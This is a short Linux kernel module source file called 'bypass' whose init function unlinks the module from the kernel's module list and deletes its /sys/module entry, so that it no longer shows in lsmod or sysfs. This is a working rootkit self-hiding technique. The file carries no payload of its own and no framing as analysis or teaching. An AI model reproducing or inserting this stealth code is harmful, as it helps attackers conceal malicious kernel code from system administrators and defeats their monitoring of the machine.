#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int bypass_init(void)
{
	printk("Bypass Loads!\n");

	/* delete module from Linux modules' list to hide our module from lsmod */
	list_del_init(&__this_module.list);

	/* delete kobject from /sys/module */
	kobject_del(&THIS_MODULE->mkobj.kobj);

	return 0;
}

static void bypass_exit(void)
{
	printk("Bypass exits!\n");
}

module_init(bypass_init);
module_exit(bypass_exit);
